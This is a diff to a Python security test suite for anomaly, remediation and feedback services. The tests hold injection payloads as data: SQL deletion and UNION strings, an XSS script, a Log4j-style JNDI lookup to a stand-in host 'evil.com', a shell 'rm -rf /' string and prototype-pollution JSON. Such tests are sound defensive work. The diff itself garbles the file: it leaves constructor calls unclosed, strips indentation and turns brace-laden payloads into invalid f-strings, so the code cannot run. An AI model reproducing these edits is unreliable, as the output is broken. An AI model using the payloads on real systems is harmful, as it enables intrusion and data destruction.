@@ -25,10 +25,9 @@ class TestInputValidationSecurity:
     
     def setup_method(self):
         """Set up test fixtures before each test method."""
-        self.anomaly_service = AnomalyService()
-        self.remediation_service = RemediationService()
-        self.feedback_service = FeedbackService()
-    
+        self.anomaly_service = AnomalyService(
+    self.remediation_service = RemediationService(
+    self.feedback_service = FeedbackService(
     def test_sql_injection_prevention_anomaly_title(self):
         """Test that SQL injection attempts in anomaly titles are safely handled."""
         malicious_inputs = [
@@ -37,8 +36,8 @@ class TestInputValidationSecurity:
             "'; DELETE FROM users; --",
             "' UNION SELECT * FROM sensitive_data --",
             "<script>alert('xss')</script>",
-            "{{ 7*7 }}",  # Template injection
-            "${jndi:ldap://evil.com/a}"  # Log4j style
+            f"{{ 7*7 }}",  # Template injection
+            f"${jndi:ldap://evil.com/a}"  # Log4j style
         ]
         
         for malicious_input in malicious_inputs:
@@ -153,11 +152,11 @@ class TestInputValidationSecurity:
     def test_json_injection_prevention(self):
         """Test that JSON injection attempts are safely handled."""
         json_payloads = [
-            '{"injection": true, "admin": true}',
+            f'{"injection": true, "admin": true}',
             '"; alert("XSS"); "',
             '\\"; system("rm -rf /"); \\"',
-            '{"__proto__": {"admin": true}}',  # Prototype pollution
-            '{"constructor": {"prototype": {"admin": true}}}'
+            f'{"__proto__": {"admin": true}}',  # Prototype pollution
+            f'{"constructor": {"prototype": {"admin": true}}}'
         ]
         
         for payload in json_payloads:
@@ -182,10 +181,9 @@ class TestDataLeakagePrevention:
     
     def setup_method(self):
         """Set up test fixtures before each test method."""
-        self.anomaly_service = AnomalyService()
-        self.remediation_service = RemediationService()
-        self.feedback_service = FeedbackService()
-    
+        self.anomaly_service = AnomalyService(
+    self.remediation_service = RemediationService(
+    self.feedback_service = FeedbackService(
     def test_sensitive_data_not_in_error_messages(self):
         """Test that sensitive data doesn't leak in error messages."""
         # Try to create anomaly with sensitive data in invalid context
@@ -241,10 +239,9 @@ class TestAuthorizationValidation:
     
     def setup_method(self):
         """Set up test fixtures before each test method."""
-        self.anomaly_service = AnomalyService()
-        self.remediation_service = RemediationService()
-        self.feedback_service = FeedbackService()
-    
+        self.anomaly_service = AnomalyService(
+    self.remediation_service = RemediationService(
+    self.feedback_service = FeedbackService(
     def test_user_id_validation(self):
         """Test that user ID validation prevents unauthorized access."""
         # Test with invalid user IDs
@@ -292,9 +289,8 @@ class TestSecurityConfiguration:
     
     def test_default_security_settings(self):
         """Test that services use secure defaults."""
-        anomaly_service = AnomalyService()
-        
-        # Create anomaly with minimal data
+        anomaly_service = AnomalyService(
+    # Create anomaly with minimal data
         anomaly_data = {
             "title": "Test Anomaly",
             "description": "Test description",
@@ -313,9 +309,8 @@ class TestSecurityConfiguration:
     
     def test_data_validation_strictness(self):
         """Test that data validation is strict and secure."""
-        remediation_service = RemediationService()
-        
-        # Test strict validation for critical fields
+        remediation_service = RemediationService(
+    # Test strict validation for critical fields
         # Test invalid action type
         invalid_action_data = {
             "anomaly_id": 1,
@@ -339,9 +334,8 @@ class TestSecurityConfiguration:
     
     def test_safe_error_handling(self):
         """Test that error handling doesn't expose sensitive information."""
-        feedback_service = FeedbackService()
-        
-        # Try to trigger various errors
+        feedback_service = FeedbackService(
+    # Try to trigger various errors
         test_cases = [
             {},  # Empty data
             {"feedback_type": "invalid"},  # Invalid type
@@ -381,8 +375,7 @@ class TestRateLimitingAndThrottling:
     
     def setup_method(self):
         """Set up test fixtures before each test method."""
-        self.anomaly_service = AnomalyService()
-    
+        self.anomaly_service = AnomalyService(
     def test_bulk_operation_limits(self):
         """Test that bulk operations have reasonable limits."""
         # Test pagination limits
